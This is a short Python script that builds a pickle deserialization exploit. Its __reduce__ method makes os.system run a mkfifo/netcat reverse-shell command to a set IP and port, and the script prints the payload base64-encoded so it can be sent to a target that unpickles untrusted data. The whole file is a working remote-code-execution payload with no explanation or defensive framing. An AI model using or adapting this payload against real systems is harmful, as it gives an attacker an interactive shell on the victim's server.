import base64
import os
import pickle
import requests

IP = "127.0.0.1"
PORT = 1234

class RCE:
    def __reduce__(self):
        cmd = "rm -rf /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc %s %d > /tmp/f" % (IP, PORT)

        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled).decode("utf-8"))
